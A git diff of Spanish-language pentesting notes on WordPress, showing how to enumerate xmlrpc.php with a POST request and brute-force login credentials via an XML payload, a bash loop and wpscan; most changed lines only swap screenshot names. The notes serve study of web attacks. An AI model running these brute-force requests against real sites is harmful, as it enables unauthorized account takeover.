@@ -1,12 +1,16 @@
 # ENUMERAR XMLRPC + ATAQUES FUERZA BRUTA WORDPRESS
 También es posible que podamos enumerar este archivo el cual nos sirve para obtener credenciales de usuarios, ya que se trata de un archivo que permite la comunicación de wordpress y otros sistemas usando php; y si lo buscamos en el navegador vemos que existe pero que sólo tramita peticiones por POST:
-![[Pasted image 20230421133400.png]]
+![[Pasted image 20240613005147.png]]
+
 Por tanto con curl vamos a enviarle una petición por POST y vemos que sí nos devuelve algo en XML:
-![[Pasted image 20230421133532.png]]
+![[Pasted image 20240613005152.png]]
+
 Y ahora que vemos que existe este fichero, buscamos en google como explotar vulnerabilidades haciendo uso de este fichero:
-![[Pasted image 20230421133725.png]]
+![[Pasted image 20240613005159.png]]
+
 Y nos dicen que tenemos que tramitar esto:
-![[Pasted image 20230421133752.png]]
+![[Pasted image 20240613005206.png]]
+
 ```php
 POST /xmlrpc.php HTTP/1.1
 Host: example.com
@@ -18,14 +22,19 @@ Content-Length: 135
 <params></params> 
 </methodCall>
 ```
+
 Por tanto pegamos este código en un fichero xml:
-![[Pasted image 20230421133907.png]]
+![[Pasted image 20240613005324.png]]
+
 Y ahora este fichero lo tramitamos por POST contra el xmlrpc de wordpress:
-![[Pasted image 20230421134022.png]]
+![[Pasted image 20240613005330.png]]
+
 Y el servidor nos responde con todos los métodos disponibles:
-![[Pasted image 20230421134102.png]]
+![[Pasted image 20240613005336.png]]
+
 Y si miramos más en la página, vemos que nos muestran como hacer un ataque de fuerza bruta:
-![[Pasted image 20230421134340.png]]
+![[Pasted image 20240613005341.png]]
+
 ```php
 <?xml version="1.0" encoding="UTF-8"?>
 <methodCall> 
@@ -37,8 +46,10 @@ Y si miramos más en la página, vemos que nos muestran como hacer un ataque de 
 </methodCall>
 ```
 Y vemos que aquí si ponemos unas credenciales correctas y lo ejecutamos como antes, nos va a funcionar correctamente:
-![[Pasted image 20230421134520.png]]
-![[Pasted image 20230421134540.png]]
+![[Pasted image 20240613005349.png]]
+
+![[Pasted image 20240613005352.png]]
+
 En este punto podríamos hacer un ataque de fuerza bruta, tanto con un script de bash o con la propia herramienta wpscan:
 ```bash
 #!/bin/bash
@@ -80,11 +91,15 @@ rm log.log enviar.xml
 
 done
 ```
-![[Pasted image 20230421143424.png]]
+
+![[Pasted image 20240613005403.png]]
+
 O también directamente desde la herramienta, lo cual será más rápido:
 ```bash
 wpscan --url <url> -U <user> -P <pass>
 ```
-![[Pasted image 20230421143525.png]]
+
+![[Pasted image 20240613005411.png]]
+
 Y nos la encuentra:
-![[Pasted image 20230421143548.png]]
+![[Pasted image 20240613005417.png]]
